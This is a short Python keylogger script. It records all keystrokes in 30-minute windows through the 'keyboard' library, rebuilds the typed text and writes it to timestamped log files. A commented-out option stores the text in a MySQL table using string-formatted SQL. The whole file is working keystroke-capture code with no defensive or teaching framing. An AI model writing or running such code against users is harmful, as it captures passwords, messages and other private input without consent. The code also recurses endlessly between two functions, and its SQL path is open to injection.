import keyboard
import time
import datetime
from mySQL import *

running = True
file_number = 0


def log():
    keyboard.start_recording()
    time.sleep(1800)
    keys = keyboard.stop_recording()
    build(keys)


def build(keys):
    string = ''
    for key in keys:
        if key.event_type == 'down':
            if key.name == 'space':
                string += ' '
            elif key.name == 'backspace':
                try:
                    string = string.removesuffix(string[-1])
                except:
                    pass
            elif key.name == 'esc':
                pass
            elif key.name == 'shift':
                string += ' (shift) '
            elif key.name == 'ctrl':
                string += ' (ctrl) '
            elif key.name == 'enter':
                string += ' (enter) '
            elif key.name == 'left':
                string += ' (left) '
            elif key.name == 'right':
                string += ' (right) '
            elif key.name == 'up':
                string += ' (up) '
            elif key.name == 'down':
                string += ' (down) '
            elif key.name == 'tab':
                string += ' (tab) '
            elif key.name == 'caps lock':
                string += ' (capslock) '
            elif key.name == 'alt':
                string += ' (alt) '
            elif key.name == 'windows':
                string += ' (windows) '
            else:
                string += key.name
    store(string)


def store(string):
    ###########Store with files################
    with open(f'logs_{str(datetime.datetime.now().strftime("%m_%d_%Y_%H_%M"))}', 'w') as logs:
        logs.write(string)

    ###########For SQL##############
    # values = "('{}', '{}')".format(datetime.datetime.now().strftime("%m_%d_%Y_%H_%M"), string)
    # add_rows('logs', '(date, logs)', values)

    log()


log()
